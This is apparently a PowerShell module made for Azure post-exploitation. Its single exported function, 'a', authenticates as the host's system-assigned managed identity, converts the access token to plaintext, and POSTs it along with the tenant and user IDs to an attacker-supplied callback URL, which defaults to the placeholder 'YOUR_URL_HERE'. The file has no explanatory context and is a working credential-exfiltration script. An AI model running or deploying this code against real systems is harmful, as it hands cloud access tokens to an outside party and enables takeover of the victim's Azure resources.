function a {
param(
    [string] $callbackURL = "http://YOUR_URL_HERE/"
    )

# Hide the warning output
$SuppressAzurePowerShellBreakingChangeWarnings = $true

# Connect as the System-Assigned Managed Identity
Connect-AzAccount -Identity | Out-Null

# Get a token
$AccessToken = Get-AzAccessToken
if ($AccessToken.Token -is [System.Security.SecureString]) {
    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
    try {
        $Token = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
    } finally {
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
    }
} else {
    $Token = $AccessToken.Token
}

# Recreate token for body
$body = @{
    Token = $Token
    ExpiresOn = $AccessToken.ExpiresOn
    TenantId = $AccessToken.TenantId
    UserId = $AccessToken.UserId
    Type = $AccessToken.Type
}

# Send the token to the callback URL
Invoke-RestMethod -Uri $callbackURL -Method Post -Body ($body | ConvertTo-Json) | Out-Null

}


Export-ModuleMember -Function a